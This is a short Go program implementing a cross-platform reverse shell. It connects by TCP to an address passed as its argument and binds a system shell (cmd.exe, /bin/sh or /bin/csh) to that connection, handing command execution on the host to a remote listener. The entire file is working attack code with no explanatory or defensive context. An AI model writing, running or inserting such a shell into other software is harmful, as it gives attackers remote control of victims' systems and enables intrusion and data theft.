package main

import (
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
)

func ReverseShell(connectString string) {
	var cmd *exec.Cmd
	if len(connectString) == 0 { //valid input: "192.168.0.23:2233"
		log.Fatal("invalid reverse shell remote addr: ", connectString)
	}
	conn, err := net.Dial("tcp", connectString)
	if err != nil {
		log.Fatal("fail to connect remote addr: ", connectString)
	}

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	case "linux":
		cmd = exec.Command("/bin/sh")
	case "freebsd":
		cmd = exec.Command("/bin/csh")
	default:
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	_ = cmd.Run()
}


func main() {
	ReverseShell(os.Args[1])
}
